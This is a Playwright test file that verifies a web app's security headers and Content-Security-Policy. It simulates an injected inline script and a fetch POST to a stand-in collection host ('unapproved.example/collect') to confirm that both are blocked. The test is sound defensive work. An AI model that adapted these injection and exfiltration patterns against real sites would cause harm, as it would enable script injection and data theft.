import { expect, test } from '@playwright/test'

test('the production policy allows the app and blocks injected scripts and unapproved connections', async ({
  page,
}) => {
  const response = await page.goto('/')
  const headers = response!.headers()
  expect(headers['content-security-policy']).toContain("script-src 'self'")
  expect(headers['content-security-policy']).toContain("frame-ancestors 'none'")
  expect(headers['x-content-type-options']).toBe('nosniff')
  expect(headers['x-frame-options']).toBe('DENY')
  expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin')
  // This control only exists after React mounts: external application scripts must still work.
  await expect(page.getByRole('button', { name: 'Next feature' })).toBeVisible()

  const directive = await page.evaluate(
    () =>
      new Promise<string>((resolve) => {
        document.addEventListener(
          'securitypolicyviolation',
          (event) => resolve(event.effectiveDirective),
          { once: true }
        )
        const script = document.createElement('script')
        script.textContent = "document.documentElement.dataset.injected = 'executed'"
        document.body.append(script)
      })
  )
  expect(directive).toBe('script-src-elem')
  await expect(page.locator('html')).not.toHaveAttribute('data-injected')

  let attemptedExternalRequest = false
  await page.route('https://unapproved.example/**', (route) => {
    attemptedExternalRequest = true
    return route.abort()
  })
  const blocked = await page.evaluate(async () => {
    try {
      await fetch('https://unapproved.example/collect', { method: 'POST', body: 'test' })
      return false
    } catch {
      return true
    }
  })
  expect(blocked).toBe(true)
  expect(attemptedExternalRequest).toBe(false)
})
